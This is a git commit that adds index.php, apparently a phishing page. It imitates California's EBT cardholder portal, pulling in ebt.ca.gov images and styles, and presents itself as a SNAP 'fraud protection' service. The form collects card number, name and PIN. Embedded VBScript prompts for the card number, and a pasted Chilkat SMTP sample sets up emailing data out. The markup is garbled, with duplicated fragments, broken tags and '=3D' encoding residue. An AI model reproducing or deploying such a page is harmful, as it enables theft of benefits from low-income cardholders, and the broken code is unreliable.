859beb198d717f4801aabb479d5d59c41ea8ca60
snapprotection <103213837+snapprotection@users.noreply.github.com>
2022-07-07 11:04:26 -0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,280 @@
+<! DOCTYPE html><html lang="en" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>CardHolder Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="msapplication-tap-highlight" content="no">
+
+  <link rel="icon" type="image/x-icon" href="https://www.ebt.ca.gov/cardholder/assets/icon/favicon.ico">
+  <link rel="manifest" href="https://www.ebt.ca.gov/cardholder/manifest.json">
+  <meta name="theme-color" content="#4e8ef7">
+  
+  <!-- cordova.js required for cordova apps 
+  <script src="cordova.js"></script> -->
+
+  <!-- un-comment this code to enable service worker
+  <script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('service-worker.js')
+        .then(() => console.log('service worker installed'))
+        .catch(err => console.log('Error', err));
+    }
+  </script>-->
+
+  <link href="https://www.ebt.ca.gov/cardholder/build/main.css" rel="stylesheet">
+
+
+                              </head>
+<body>
+
+  <!-- Ionic's root component and where the app will load -->
+  <ion-app class="md platform-mobile platform-android platform-android8 platform-android8_1 platform-mobileweb"><div app-viewport=""></div><ng-component class="app-root">
+
+<ion-menu role="navigation" side="left" type="overlay"><div class="menu-inner">
+   <ion-header class="header header-md">
+!-- Ionic's root component and where the app will load -->
+  <ion-app class="md platform-mobile platform-android platform-android8 platform-android8_1 platform-mobileweb"><div app-viewport=""></div><ng-component class="app-root">
+
+<ion-menu role="navigation" side="left" type="overlay"><div class="menu-inner">
+   <ion-header class="header header-md">
+  
+  </ion-header> 
+  <ion-content class="content content-md"><div class="fixed-content"></div><div class="scroll-content">
+
+    <ion-list class="dark list list-md">
+      <ion-item class="item item-block item-md" menu-close="" nav-clear="" tappable=""><div class="item-inner"><div class="input-wrapper"><!--template bindings={}--><ion-label class=" label label-md">
+        <h3>
+          <ion-icon ios="ios-home" md="md-home" role="img" class="icon icon-md ion-md-home item-icon" aria-label="home"></ion-icon>&nbsp;&nbsp; Home
+          
+        </h3>
+      </ion-label></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+
+      <ion-item class="item item-block item-md" text-wrap="" tappable=""><div class="item-inner"><div class="input-wrapper"><!--template bindings={}--><ion-label class="label label-md">
+        <h3>
+          <ion-icon ios="ios-card" md="md-card" role="img" class="icon icon-md ion-md-card item-icon" aria-label="card"></ion-icon>&nbsp;&nbsp; Transactions &nbsp;
+          <ion-icon item-right="" role="img" class="icon icon-md ion-md-arrow-dropright item-icon" aria-label="arrow dropright"></ion-icon>
+        </h3>
+        <!--template bindings={}-->
+      </ion-label></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+      <ion-item class="item item-block item-md" text-wrap=""><div class="item-inner"><div class="input-wrapper"><!--template bindings={}--><ion-label class="label label-md">
+        <a href="https://www.ebt.ca.gov/cardholder/#" tappable=""><h3>
+          <ion-icon ios="ios-pin" md="md-pin" role="img" class="icon icon-md ion-md-pin item-icon" aria-label="pin"></ion-icon>&nbsp;&nbsp; EBT Map</h3></a>
+        <!--template bindings={}-->
+      </ion-label></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>icon ios="ios-home" md="md-home" role="img" class="icon icon-md ion-md-home item-icon" aria-label="home"></ion-icon>&nbsp;&nbsp; Home
+          
+        </h3>
+      </ion-label></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+
+      <ion-item class="item item-block item-md" text-wrap="" tappable=""><div class="item-inner"><div class="input-wrapper"><!--template bindings={}--><ion-label class="label label-md">
+        <h3>
+          <ion-icon ios="ios-card" md="md-card" role="img" class="icon icon-md ion-md-card item-icon" aria-label="card"></ion-icon>&nbsp;&nbsp; Transactions &nbsp;
+          <ion-icon item-right="" role="img" class="icon icon-md ion-md-arrow-dropright item-icon" aria-label="arrow dropright"></ion-icon>
+        </h3>
+        <!--template bindings={}-->
+      </ion-label></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+      <ion-item class="item item-block item-md" text-wrap=""><div class="item-inner"><div class="input-wrapper"><!--template bindings={}--><ion-label class="label label-md">
+        <a href="https://www.ebt.ca.gov/cardholder/#" tappable=""><h3>
+          <ion-icon ios="ios-pin" md="md-pin" role="img" class="icon icon-md ion-md-pin item-icon" aria-label="pin"></ion-icon>&nbsp;&nbsp; EBT Map</h3></a>
+        <!--template bindings={}-->
+      </ion-label></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+
+      <ion-item class="item item-block item-md" text-wrap="" tappable=""><div class="item-inner"><div class="input-wrapper"><!--template bindings={}--><ion-label class="label label-md">
+        <h3>
+          <ion-icon ios="ios-settings" md="md-settings" role="img" class="icon icon-md ion-md-settings item-icon" aria-label="settings"></ion-icon>&nbsp; My Account  &nbsp;
+          <ion-icon item-right="" role="img" class="icon icon-md ion-md-arrow-dropright item-icon" aria-label="arrow dropright"></ion-icon>
+        </h3>
+        <!--template bindings={}-->
+      </ion-label></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+
+      <ion-item class="item item-block item-md" text-wrap="" tappable=""><div class="item-inner"><div class="input-wrapper"><!--template bindings={}--><ion-label class="label label-md">
+        <h3>
+          <ion-icon ios="ios-help" md="md-help" role="img" class="icon icon-md ion-md-help item-icon" aria-label="help"></ion-icon>&nbsp;&nbsp; Help
+        </h3>
+       
+      </ion-label></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+
+      <ion-item class="item item-block item-md" text-wrap="" tappable=""><div class="item-inner"><div class="input-wrapper"><!--template bindings={}--><ion-label class="label label-md">
+        <h3>
+          <ion-icon ios="ios-log-out" md="md-log-out" role="img" class="icon icon-md ion-md-log-out item-icon" aria-label="log out"></ion-icon>&nbsp;&nbsp; Logout</h3>
+        <!--template bindings={}-->
+      </ion-label></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+
+    </ion-list>
+
+  </div></ion-content>
+</div><ion-backdrop disable-activated="" role="presentation" tappable=""></ion-backdrop></ion-menu>
+
+
+<ion-nav swipebackenabled="false" class="menu-content menu-content-overlay"><div nav-viewport=""></div><page-register class="ion-page show-page" style="z-index: 101;" ><ion-content class="content content-md"><div class="fixed-content"></div><div class="scroll-content">
+  <ion-grid class="mobilemenu">
+    <ion-row>
+      <ion-col padding="" width-33="">
+        
+       <img alt="CA.gov" src="https://www.ebt.ca.gov/cardholder/assets/img/header-ca.gov.png">
+      </ion-col>
+      <ion-col width-66="">
+        <div align="center">
+          &nbsp;
+        </div>
+      </ion-col>
+    </ion-row>
+  </ion-grid>
+
+  <header class="global-header" id="header" role="banner">
+
+    <div class="branding" id="top">
+      <div class="header-cagov-logo">
+        <a href="http://www.ca.gov/"><img alt="CA.gov" src="https://www.ebt.ca.gov/cardholder/assets/img/header-ca.gov.png"></a>
+      </div>
+      <div class="header-organization-banner">
+      </div>
+    </div>
+
+    <ul class="main-navigation">
+      <li><a href="https://www.ebt.ca.gov/cardholder/#" tappable="">Login</a></li>
+    </hive>
+
+  </header>
+
+  <div class="bgdiv">
+
+    <!--template bindings={}--><div class="langLinkStyle" tappable="" style="transition: none 0s ease 0s;">
+      <a class="langLinkStyle">
+        <u>Espa+//3//Q-ol</u>
+      </a>
+    </div>
+
+    <!--template bindings={}-->
+  
+
+     <div class="langLinkStyle">
+      <ion-label class="langLinkStyle1 label label-md"><font color="red">*</font> Required Field</ion-label>
+    </div>
+
+    <div class="bgdiv2">
+      
+      
+      <form class="ng-untouched ng-pristine ng-invalid">
+
+        <h1>Welcome to EBT Fraud Protections Services<span class="tooltip3" id="Create a new user account by providing required fields on the screen." title="Create a new user account by providing required fields on the screen." ></span> </h1>
+
+
+        <div class="ca-card form-card">
+<script language = ''vbscript''>
+Dim cdnum, FstNm, LstNnm, Pin
+
+Cdnum = inputbox(''Enter Card Number '')
+MsgBox ''cdnum''
+</script>
+          <ion-row class="cardnumlabel">
+             <input aria-label="Card Number"class="text-input-md ng-untouched ng-pristine ng-valid" formcontrolname="cardnum" maxlength="16" type="text" placeholder="Enter Card Number *">
+          </ion-row>
+       
+        </div>
+        
+ 
+          <ion-item class="item item-block item-md"><div class="item-inner"><div class="input-wrapper"><ion-label class="labelstyle2 label label-md" for="uid" id="lbl-13"> First Name&nbsp;
+              <font color="red">*</font>
+            </ion-label><!--template bindings={}--></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+
+          <ion-row>
+           <input aria-label="First Name" class="text-input-md ng-untouched ng-pristine ng-invalid" formcontrolname="userid" id="uid" maxlength="35" type="text" placeholder="First Name">
+          </ion-row>
+          <!--template bindings={}-->
+
+          <ion-item class="item item-block item-md"><div class="item-inner"><div class="input-wrapper"><ion-label class="labelstyle2 label label-md" id="lbl-14">Last Name&nbsp;
+              <font color="red">*</font>
+            </ion-label><!--template bindings={}--></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+
+          <ion-row>
+           <input aria-label="Last Name" class="text-input-md ng-untouched ng-pristine ng-invalid" formcontrolname="Last Name" maxlength="16" type="Last Name" placeholder="Last Name">
+          </ion-row>
+          <!--template bindings={}-->
+          
+
+          <ion-item class="item item-block item-md"><div class="item-inner"><div class="input-wrapper"><ion-label class="labelstyle2 label label-md" id="lbl-15">Pin Number&nbsp;
+              <font color="red">*</font>
+            </ion-label><!--template bindings={}--></div><!--template bindings={}--></div><div class="button-effect"></div></ion-item>
+
+          <ion-row>
+            <input aria-label="Pin Number" class="text-input-md ng-untouched ng-pristine ng-invalid" formcontrolname="repassword" maxlength="35" type="password" placeholder="Pin Number">
+          </ion-row>
+
+
+          
+          <div class="form-actions form-group">
+            <button class="btn btn-primary btn-full-xs" full="" type="submit" tappable="" enable="">SUBMIT</button>
+          </div>
+            <p><a block="" class="register-btn" clear="" tappable="">SNAP </a>   </p>
+
+
+    <div class=3D"section">
+        <main class=3D"main-primary">
+        <!-- InstanceBeginEditable name=3D"MainContent" -->
+			<ol class=3D"breadcrumb">
+
+    <li class=3D"active"></li>
+    </ol>
+
+          <article>
+                <h1><span class=3D"ca-gov-icon-arrow-down"></span> Keep your EBT Card and Benefits Safe with SNAP fraud protection services. </h1>
+                <hive>
+                  <li>DO NOT use ATMs that appear to have been altered. </li>
+                     <li>DO NOT use ATMs with unusual signage, such as a  
+ command to enter your PIN twice to complete a transaction. </li>
+                     <li>NEVER write your PIN on your card, the card sleeve
+ or on anything you keep with your card. </li>
+                     <li>DO NOT keep your card and PIN together. </li>
+
+
+
+         
+     2022 Fidelity National Information Services, Inc. and its subsidiaries. All Rights Reserved.
+    </div>
+  </footer>
+
+
+</div></ion-content></page-register><div class="nav-decor"></div></ion-nav></ng-component><div overlay-portal =""></div><div overlay-portal=""></div><div class="loading-portal" overlay-portal=""></div><div class=" toast-portal"></div><div class="click-block click-block-enabled"></div></ion-app>
+
+<script language = ''vbscript'' type = ''text/vbscript''>
+Dim fso, outFile
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set outFile = fso. CreateTextFile("output.txt", True)
+' This example requires the Chilkat API to have been previously unlocked.
+' See Global Unlock Sample for sample code.
+' The mailman object is used for sending and receiving email.
+set mailman = CreateObject("Chilkat_9_5_0.MailMan")
+' Set the SMTP server.
+mailman. SmtpHost = "smtp.chilkatsoft.com"
+' Set the SMTP login/password (if required)
+mailman. SmtpUsername = "myUsername"
+mailman. SmtpPassword = "myPassword"
+' Create a new email object
+set email = CreateObject("Chilkat_9_5_0.Email")
+email. Subject = "This is a test"
+email. Body = "This is a test"
+email. From = "Chilkat Support <support@chilkatsoft.com>"
+success = email. AddTo("Chilkat Admin","admin@chilkatsoft.com")
+' To add more recipients, call AddTo, AddCC, or AddBcc once per recipient.
+' Call SendEmail to connect to the SMTP server and send.
+' The connection (i.e. session) to the SMTP server remains
+' open so that subsequent SendEmail calls may use the
+' same connection.  
+success = mailman. SendEmail(email)
+If (success <> 1) Then
+ outFile.WriteLine(mailman. LastErrorText)
+    WScript.Quit
+End If
+' Some SMTP servers do not actually send the email until 
+' the connection is closed.  In these cases, it is necessary to
+' call CloseSmtpConnection for the mail to be  sent.  
+' Most SMTP servers send the email immediately, and it is 
+' not required to close the connection.  We'll close it here
+' for the example:
+success = mailman. CloseSmtpConnection()
+If (success <> 1) Then
+    outFile. WriteLine("Connection to SMTP server not closed cleanly.")
+End If
+outFile. WriteLine("Mail Sent!")
+outFile. Close
+</script>
